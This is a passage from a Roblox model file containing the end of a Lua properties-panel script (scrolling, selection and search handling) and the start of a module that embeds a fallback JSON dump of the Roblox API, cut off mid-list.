		scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
		scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
		ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
	end

	function scrollBarH.UpdateCallback(self)
		
	end

	MainFrame.Changed:connect(function(p)
		if p == 'AbsoluteSize' then
			scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
			scrollBarH:Update()
			scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
			scrollBar:Update()
		end
	end)

	local wheelAmount = Row.Height
	PropertiesFrame.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	PropertiesFrame.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
scrollBar:Update()

showProperties(GetSelection())

bindSelectionChanged.Event:connect(function()
	showProperties(GetSelection())
end)

bindSetAwait.Event:connect(function(obj)
	if AwaitingObjectValue then
		AwaitingObjectValue = false
		local mySel = obj
		if mySel then
			pcall(function()
				Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
			end)
		end
	end
end)

propertiesSearch.Changed:connect(function(prop)
	if prop == "Text" then
		showProperties(GetSelection())
	end
end)

bindGetApi.OnInvoke = function()
	return RbxApi
end

bindGetAwait.OnInvoke = function()
	return AwaitingObjectValue
end]]></ProtectedString>
						</Properties>
						<Item class="ModuleScript" referent="RBX6A24EADFFE49415FB36F570CDDE6D4F6">
							<Properties>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">RawApiJson</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[--[[
	This is a fallback in case HttpService is disabled or the latest version cannot be fetched
	http://anaminus.github.io/rbx/json/api/latest.json
--]]

local json = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint",